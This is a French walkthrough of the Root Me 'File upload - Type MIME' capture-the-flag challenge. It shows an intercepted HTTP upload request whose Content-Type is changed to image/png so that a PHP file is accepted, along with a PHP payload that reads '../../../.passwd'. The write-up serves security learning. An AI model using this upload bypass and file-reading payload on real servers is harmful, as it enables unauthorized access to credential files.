# File upload - Type MIME

[Challenges/Web - Serveur : File upload - Type MIME [Root Me : plateforme d'apprentissage dédiée au Hacking et à la Sécurité de l'Information]](https://www.root-me.org/fr/Challenges/Web-Serveur/File-upload-Type-MIME)

Le principe du MIME est de dire au serveur que j’envoie un fichier de content : image au lieu d’application.

En gros :

On intercepte la requête :

POST /web-serveur/ch21/?action=upload HTTP/1.1

Host: challenge01.root-me.org

Content-Length: 250

Cache-Control: max-age=0

Accept-Language: en-US,en;q=0.9

Origin: http://challenge01.root-me.org

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2kqCXQz1k2qMT3uh

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://challenge01.root-me.org/web-serveur/ch21/?action=upload

Accept-Encoding: gzip, deflate, br

Cookie: PHPSESSID=4555559e99c9ffda4270aef9d0f44ddb; _ga_SRYSKX09J7=GS2.1.s1766121191$o1$g0$t1766121191$j60$l0$h0; _ga=GA1.1.1104325533.1766121192

Connection: keep-alive

------WebKitFormBoundary2kqCXQz1k2qMT3uh

Content-Disposition: form-data; name="file"; filename="exploit2.php"

Content-Type: application/x-php

<?php

    echo file_get_contents('../../../.passwd');

?>

------WebKitFormBoundary2kqCXQz1k2qMT3uh—

On cahnge la partie : 

Content-Type: application/x-php

De ce fait, on met ‘image/png’ au lieu de ‘application/x-php’

Ca donne : 

Dontent-Type : image/png

On envoi la requête comme ça et ça fonctionne !

Mais….

Gros souci, on peut regarder un peut partout avec « ls -la » mais on ne peut pas faire un cat .passwd 

Donc je change de fichier et j’envoie un autre qui contient :

<?php

    echo file_get_contents('../../../.passwd');

?>

Et la on trouve le flag rien qu’en ouvrant le fichier sur le site :

http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/4555559e99c9ffda4270aef9d0f44ddb//exploit2.php
